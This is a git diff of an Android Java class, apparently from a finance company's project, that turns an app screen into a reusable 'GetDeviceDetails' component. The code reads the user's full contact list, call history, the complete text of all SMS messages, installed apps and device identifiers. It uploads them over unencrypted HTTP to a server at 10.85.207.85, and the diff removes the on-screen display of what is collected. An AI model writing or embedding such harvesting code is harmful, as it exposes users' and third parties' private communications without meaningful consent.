@@ -1,30 +1,25 @@
-package com.muthootfinance.retreivesdk;
+package com.muthootfinance.retrievedetails;
 
 import static android.content.ContentValues.TAG;
 
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.app.Application;
 import android.content.ContentResolver;
-import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
-import android.provider.Settings;
-import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.TextView;
 import android.widget.Toast;
+
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.android.volley.AuthFailureError;
 import com.android.volley.NetworkResponse;
@@ -35,69 +30,42 @@ import com.android.volley.VolleyError;
 import com.android.volley.VolleyLog;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
-import com.muthootfinance.retrievedetails.GetDeviceDetails;
+import com.muthootfinance.retreivesdk.BuildConfig;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.DataOutputStream;
 import java.io.File;
-import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.OutputStreamWriter;
 import java.io.UnsupportedEncodingException;
-import java.net.HttpURLConnection;
-import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 
-
-public class MainActivity extends GetDeviceDetails {
+public class GetDeviceDetails extends Activity {
 
     List<String> list = new ArrayList<>();
-    TextView contacts, callLogs, sms, apps;
     SimpleDateFormat simpleDate = new SimpleDateFormat("yyyyMMdd", Locale.US);
     SimpleDateFormat simpleTime = new SimpleDateFormat("hh:mm:ss", Locale.US);
     String time, date;
-    TelephonyManager telephonyManager;
     SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
     SimpleDateFormat formatterTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
     private String android_id;
     String currentDate, currentTime;
     public  static final int PERMISSIONS_MULTIPLE_REQUEST = 123;
 
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-        contacts = findViewById(R.id.contacts);
-        callLogs = findViewById(R.id.callLog);
-        sms = findViewById(R.id.sms);
-        apps = findViewById(R.id.apps);
-        time = simpleTime.format(new Date());
-        date = simpleDate.format(new Date());
-        currentDate = formatter.format(new Date());
-        currentTime = formatterTime.format(new Date());
-        android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(),
-                Settings.Secure.ANDROID_ID);
-
-        checkPermission();
-    }
-
     private void checkPermission() {
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_CONTACTS) + ContextCompat
                 .checkSelfPermission(this,
                         Manifest.permission.READ_CALL_LOG) + ContextCompat
-                                .checkSelfPermission(this,
-                                        Manifest.permission.READ_SMS) + ContextCompat
-                                                .checkSelfPermission(this,
-                                                        Manifest.permission.READ_PHONE_STATE)  + ContextCompat
+                .checkSelfPermission(this,
+                        Manifest.permission.READ_SMS) + ContextCompat
+                .checkSelfPermission(this,
+                        Manifest.permission.READ_PHONE_STATE)  + ContextCompat
                 .checkSelfPermission(this,
                         Manifest.permission.INTERNET) + ContextCompat
                 .checkSelfPermission(this,
@@ -110,10 +78,10 @@ public class MainActivity extends GetDeviceDetails {
                     (this, Manifest.permission.READ_CONTACTS) ||
                     ActivityCompat.shouldShowRequestPermissionRationale
                             (this, Manifest.permission.READ_CALL_LOG) ||
-                                    ActivityCompat.shouldShowRequestPermissionRationale
-                                            (this, Manifest.permission.READ_SMS) ||
-                                                    ActivityCompat.shouldShowRequestPermissionRationale
-                                                            (this, Manifest.permission.READ_PHONE_STATE) ||
+                    ActivityCompat.shouldShowRequestPermissionRationale
+                            (this, Manifest.permission.READ_SMS) ||
+                    ActivityCompat.shouldShowRequestPermissionRationale
+                            (this, Manifest.permission.READ_PHONE_STATE) ||
                     ActivityCompat.shouldShowRequestPermissionRationale
                             (this, Manifest.permission.INTERNET) ||
                     ActivityCompat.shouldShowRequestPermissionRationale
@@ -122,9 +90,9 @@ public class MainActivity extends GetDeviceDetails {
                             (this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     requestPermissions(
-                                            new String[]{Manifest.permission
-                                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                                            PERMISSIONS_MULTIPLE_REQUEST);
+                            new String[]{Manifest.permission
+                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
+                            PERMISSIONS_MULTIPLE_REQUEST);
 //                    getPhoneContacts();
 //            getCallLogs();
 //            getAllSms();
@@ -163,35 +131,34 @@ public class MainActivity extends GetDeviceDetails {
     @SuppressLint({"Range", "HardwareIds"})
     public void getPhoneContacts() {
         int count = 0;
-            ContentResolver contentResolver = getContentResolver();
-            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+        ContentResolver contentResolver = getContentResolver();
+        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
 
-            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-            Log.i("ContactDemo", "Total # of Contacts" + Integer.toString(cursor.getCount()));
-            if (cursor.getCount() > 0) {
-                while (cursor.moveToNext()) {
-                    Log.d("ContactDemo", "----Fetch Contact");
-                    @SuppressLint("Range") String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        Log.i("ContactDemo", "Total # of Contacts" + Integer.toString(cursor.getCount()));
+        if (cursor.getCount() > 0) {
+            while (cursor.moveToNext()) {
+                Log.d("ContactDemo", "----Fetch Contact");
+                @SuppressLint("Range") String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
 
-                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
-                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                        Cursor pCur = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
-                        while (pCur.moveToNext()) {
-                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            Log.i("ContactDemo", "Name: " + name);
-                            list.add(name + " - " + phoneNo);
-                            Log.i("ContactDemo", "Phone Number: " + phoneNo);
+                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        Log.i("ContactDemo", "Name: " + name);
+                        list.add(name + " - " + phoneNo);
+                        Log.i("ContactDemo", "Phone Number: " + phoneNo);
 //                            callContactPushApi(name, phone+No, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
 //                            generateFile(count++, name, phoneNo, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
-                        }
-                        callContactPushApi(list.toString(), "Phone", currentDate, currentTime, android_id, "Android SDK", "Android SDK");
-                        contacts.setText(list.toString());
-                        pCur.close();
                     }
-
+                    callContactPushApi(list.toString(), "Phone", currentDate, currentTime, android_id, "Android SDK", "Android SDK");
+                    pCur.close();
                 }
+
             }
+        }
     }
 
     void generateFile(int count, String name, String number, String date, String time, String deviceId, String uid, String lusr) {
@@ -285,45 +252,44 @@ public class MainActivity extends GetDeviceDetails {
 
     @SuppressLint("HardwareIds")
     public void getCallLogs() {
-            StringBuffer sb = new StringBuffer();
-            Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
-                    null, null, null);
-            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int cache_name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
-            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
-            while (managedCursor.moveToNext()) {
-                String phNumber = managedCursor.getString(number);
-                String name = managedCursor.getString(cache_name);
-                String callType = managedCursor.getString(type);
-                String callDate = managedCursor.getString(date);
-                Date callDayTime = new Date(Long.valueOf(callDate));
-                String callDuration = managedCursor.getString(duration);
-                String dir = null;
-                Log.d("CallDate", callDate);
-                int dircode = Integer.parseInt(callType);
-                switch (dircode) {
-                    case CallLog.Calls.OUTGOING_TYPE:
-                        dir = "OUTGOING";
-                        break;
+        StringBuffer sb = new StringBuffer();
+        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
+                null, null, null);
+        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int cache_name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
+        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+        while (managedCursor.moveToNext()) {
+            String phNumber = managedCursor.getString(number);
+            String name = managedCursor.getString(cache_name);
+            String callType = managedCursor.getString(type);
+            String callDate = managedCursor.getString(date);
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = managedCursor.getString(duration);
+            String dir = null;
+            Log.d("CallDate", callDate);
+            int dircode = Integer.parseInt(callType);
+            switch (dircode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
 
-                    case CallLog.Calls.INCOMING_TYPE:
-                        dir = "INCOMING";
-                        break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
 
-                    case CallLog.Calls.MISSED_TYPE:
-                        dir = "MISSED";
-                        break;
-                }
-                sb.append(phNumber + "---" + name + "---" + dir + "---" + callDayTime + "---" + callDuration);
-//                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
             }
+            sb.append(phNumber + "---" + name + "---" + dir + "---" + callDayTime + "---" + callDuration);
+//                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
+        }
         managedCursor.close();
         callCallLogPushApi(1, "phNumber", sb.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
 
-            Log.d("Call Logs",sb.toString());
-            callLogs.setText(sb);
+        Log.d("Call Logs",sb.toString());
     }
 
     void callCallLogPushApi(int id, String number, String name, String duration, String callType, String timestamp, String deviceId, String uid, String lusr) {
@@ -391,43 +357,42 @@ public class MainActivity extends GetDeviceDetails {
 
     @SuppressLint("HardwareIds")
     public void getAllSms() {
-            List<String> lstSms = new ArrayList<>();
-            Uri message = Uri.parse("content://sms/");
-            ContentResolver cr = MainActivity.this.getContentResolver();
+        List<String> lstSms = new ArrayList<>();
+        Uri message = Uri.parse("content://sms/");
+        ContentResolver cr = this.getContentResolver();
 
-            Cursor c = cr.query(message, null, null, null, null);
-            MainActivity.this.startManagingCursor(c);
-            int totalSMS = c.getCount();
+        Cursor c = cr.query(message, null, null, null, null);
+        this.startManagingCursor(c);
+        int totalSMS = c.getCount();
 
-            if (c.moveToFirst()) {
-                for (int i = 0; i < totalSMS; i++) {
+        if (c.moveToFirst()) {
+            for (int i = 0; i < totalSMS; i++) {
 
-                    String address = c.getString(c
-                            .getColumnIndexOrThrow("address"));
-                    String msg = c.getString(c.getColumnIndexOrThrow("body"));
-                    @SuppressLint("Range") String readState = c.getString(c.getColumnIndex("read"));
-                    String time = c.getString(c.getColumnIndexOrThrow("date"));
-                    //if readState = 1 then inbox else sent
-                    lstSms.add(address + "," + msg + "," + readState + "," + time);
-                    String dateString = formatter.format(new Date(Long.parseLong(time)));
-                    String timeString = formatterTime.format(new Date(Long.parseLong(time)));
+                String address = c.getString(c
+                        .getColumnIndexOrThrow("address"));
+                String msg = c.getString(c.getColumnIndexOrThrow("body"));
+                @SuppressLint("Range") String readState = c.getString(c.getColumnIndex("read"));
+                String time = c.getString(c.getColumnIndexOrThrow("date"));
+                //if readState = 1 then inbox else sent
+                lstSms.add(address + "," + msg + "," + readState + "," + time);
+                String dateString = formatter.format(new Date(Long.parseLong(time)));
+                String timeString = formatterTime.format(new Date(Long.parseLong(time)));
 //                    callMessagePushApi(1, address, msg, dateString, timeString, android_id, "Android SDK", "Android SDK");
 //                    sendData(1, address, msg, dateString, timeString, android_id, "Android SDK", "Android SDK");
-                   c.moveToNext();
-                }
+                c.moveToNext();
             }
+        }
 
 //        sendData(1,  "Send Data",lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
-            Log.d("SMS - ", lstSms.toString());
-            sms.setText(lstSms.toString());
-            callMessagePushApi(1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
-            c.close();
+        Log.d("SMS - ", lstSms.toString());
+        callMessagePushApi(1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
+        c.close();
 
     }
 
     void callMessagePushApi(int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
             String URL = "http://10.85.207.85:2024/api/SaveSmsDetails";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("Id", id);
@@ -502,7 +467,6 @@ public class MainActivity extends GetDeviceDetails {
             Log.d(TAG, "Inserted");
         }
         callAppsPushApi(1, appsList.toString(), "packageName", date, time, android_id, "Android SDK", "Android SDK");
-        apps.setText(appsList.toString());
     }
 
     void callAppsPushApi(int id, String appName, String packageName, String date, String time, String deviceId, String uid, String lusr) {
@@ -569,7 +533,7 @@ public class MainActivity extends GetDeviceDetails {
 
     @SuppressLint("HardwareIds")
     public void getDeviceDetails() {
-            callDeviceDetailsPushApi(1, "Android", Build.BRAND, Build.MODEL, String.valueOf(Build.VERSION.SDK_INT), currentDate, currentTime, android_id, "Android SDK", "Android SDK");
+        callDeviceDetailsPushApi(1, "Android", Build.BRAND, Build.MODEL, String.valueOf(Build.VERSION.SDK_INT), currentDate, currentTime, android_id, "Android SDK", "Android SDK");
     }
 
     void callDeviceDetailsPushApi(int id, String osType, String device, String model, String osVersion, String date, String time, String deviceId, String uid, String lusr) {
@@ -635,4 +599,5 @@ public class MainActivity extends GetDeviceDetails {
             e.printStackTrace();
         }
     }
+
 }
